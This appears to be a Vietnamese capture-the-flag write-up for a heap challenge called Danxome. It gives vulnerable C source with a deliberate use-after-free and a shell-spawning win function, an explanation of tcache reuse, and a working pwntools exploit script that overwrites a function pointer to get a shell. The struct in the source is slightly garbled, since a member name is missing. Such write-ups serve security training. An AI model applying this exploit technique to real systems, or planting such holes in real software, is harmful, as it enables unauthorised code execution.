### Danxome
#### Source

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define MINON_SIZE 10
#define MAX_NAME_SIZE 0x40

typedef struct Awhouangan Awhouangan;
typedef struct Gbeto Gbeto;
typedef struct Minon Minon;
typedef void (*speakFunc)(char*);

enum MinonType {
    AWHOUANGAN,
    GBETO
};

struct Minon
{
    speakFunc   
    ;
    enum MinonType type;
    char* name;
};

struct Danxome
{
    int numOfMinon;
    Minon* minons[MINON_SIZE];
} danxome = { .numOfMinon = 0 };

void Nawi() {
    system("/bin/sh");
}

void print(char* str) {
    system("/usr/bin/date +\"%Y/%m/%d %H:%M.%S\" | tr -d '\n'");
    printf(": %s\n", str);
}

void speak(char* name) {
    print(name);
}

void init() {
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stderr, 0, 2, 0);
  alarm(60);
}

int menu() {
    int choice = -1;
    print("Welcome to Danxome Military zone !!!");
    print("1) Add Minon");
    print("2) Remove Minon");
    print("3) Report Minon Name");
    print("0) Exit");
    
    while (1) {
        printf("> ");
        scanf("%d", &choice);
        if (choice >= 0 && choice < 5) {
            break;
        }
        printf("??\n");
    }
    printf("\n");

    return choice;
}

void add_minon() {
    int choice;
    int size;
    int idx;
    Minon* minon;

    if (danxome.numOfMinon >= MINON_SIZE) {
        print("[ERROR] The Military zone is full.");
        return;
    }

    for (idx = 0; idx < MINON_SIZE; idx++) {
        if (danxome.minons[idx] == NULL) {
            break;
        }
    }

    minon = (Minon*) malloc(sizeof(Minon));

    print("Type of Minon?");
    print("1) Awhouangan");
    print("2) Gbeto");

    while (1) {
        printf("> ");
        scanf("%d", &choice);
        if (choice == 1) {
            minon->type = AWHOUANGAN;
            break;
        } 
        if (choice == 2) {
            minon->type = GBETO;
            break;
        }
        printf("??\n");
    }

    minon->speak = speak;
    print("How long is the name? (max: 64 characters)");   
    while (1) {
        printf("> ");
        scanf("%d", &size);
        if (size >= 0 && size < MAX_NAME_SIZE) {
            minon->name = (char*) malloc(size);
            break;
        } 
        printf("??\n");
    }

    print("Name of minon?");
    printf("> ");
    read(0, minon->name, size);

    danxome.minons[idx] = minon;
    printf("> [DEBUG] Minon is added to Military zone %d\n", idx);
    danxome.numOfMinon++;
}

void remove_minon() {
    int choice;

    if (danxome.numOfMinon <= 0) {
        print("[ERROR] No minon in the Military zone.");
        return;
    }

    print("Zone number? (0-9)");
    while (1) {
        printf("> ");
        scanf("%d", &choice);
        if (choice >= 0 && choice < MINON_SIZE) {
            break;
        }
        printf("??\n");
    }

    if (danxome.minons[choice] == NULL) {
        print("[ERROR] No minon in this zone.");
        return;
    }

    free(danxome.minons[choice]->name);
    free(danxome.minons[choice]);               //UAF

    printf("> [DEBUG] Minon is removed from zone %d\n", choice);
    
    danxome.numOfMinon--;
}

void report_name() {
    int choice;

    if (danxome.numOfMinon <= 0) {
        print("[ERROR] No minon in the Military zone.");
        return;
    }

    print("Zone number? (0-9)");
    while (1) {
        printf("> ");
        scanf("%d", &choice);
        if (choice >= 0 && choice < MINON_SIZE) {
            break;
        }
        printf("??\n");
    }

    if (danxome.minons[choice] == NULL) {
        print("[ERROR] No minon in this zone.");
        return;
    }

    danxome.minons[choice]->speak(danxome.minons[choice]->name);
}

int main(int argc, char const *argv[]) {
    int leave = 0;
    init();
    while(!leave) {
        switch (menu()) {
        case 1:
            add_minon();
            break;
        case 2:
            remove_minon();
            break;
        case 3:
            report_name();
            break;
        default:
            leave = 1;
        }
        printf("\n");
    }
    return 0;
}

```
#### Ý tưởng 
- Ta có lỗi UAF do chương trình sau khi free, không hề xoá con trỏ
![image](https://github.com/wan-hyhty/trainning/assets/111769169/40d02578-2fbd-45fc-8ed9-71640c735165)

- Mỗi khi tạo 1 minon mới, tạo 2 chunk, chunk đầu tiên size mặc định 0x20 để lưu hàm speak, và chunk thứ 2 được sử dụng để lưu tên
- Khi report_name, chương trình sẽ lấy chunk đầu tiên đang lưu hàm speak vào rdx, và call rdx
![image](https://github.com/wan-hyhty/trainning/assets/111769169/7b29f5a4-24bc-4b20-8c40-6abc44f45820)

- Vậy ta cần phải ow chunk đầu tiên thành hàm `Nawi()` chứa `system()`
- Để có thể ow chunk chứa speak, ta sẽ lợi dụng cơ chế LIFO của fastbin, tcache

#### Khai thác
- Đầu tiên ta sẽ tạo 2 minon 0 và 1 như sau và free theo thứ tự sau:

![image](https://github.com/wan-hyhty/trainning/assets/111769169/7f9aaf25-dff0-44b9-8357-839af29db12e)

- Khi này trong fastbin thứ tự các chunk như số màu đỏ
- Khi ta tạo thêm 1 chunk có size 0x20, chương trình sẽ lấy chunk 4 (để lưu speak) và chunk 2 (để lưu tên)
- Ta thấy rằng do chương trình không xoá con trỏ ra khỏi danh sách minon, ta đã có thể UAF minon 0, ow speak thành `Nawi()`
![image](https://github.com/wan-hyhty/trainning/assets/111769169/766694ab-b35c-48f1-a741-3d389ea89293)

```python
from pwn import *

# p = remote('pwn.battlectf.online', 1006)

p = process("./minon")

elf = ELF('./minon')
get_shell = elf.symbols['Nawi']

gdb.attach(p, gdbscript = '''
           b*0x000000000040131f
           b*0x0000000000401616
           b*0x00000000004016f1
           c
           
           ''')
input()
def add(size, name):
    p.sendlineafter(b'>', b'1')
    p.sendlineafter(b'>', b'1')
    p.sendlineafter(b'>', str(size).encode('utf-8'))
    p.sendafter(b'>', name)
    p.recvuntil(b'> [DEBUG]')

def remove(idx):
    p.sendlineafter(b'>', b'2')
    p.sendlineafter(b'>', str(idx).encode('utf-8'))

def report(idx):
    p.sendlineafter(b'>', b'3')
    p.sendlineafter(b'>', str(idx).encode('utf-8'))

add(0x18, b'a'*8)
add(0x38, b'a'*8)

remove(0)
remove(1)

add(0x18, flat(elf.sym['Nawi']))

report(0) 
p.interactive()
```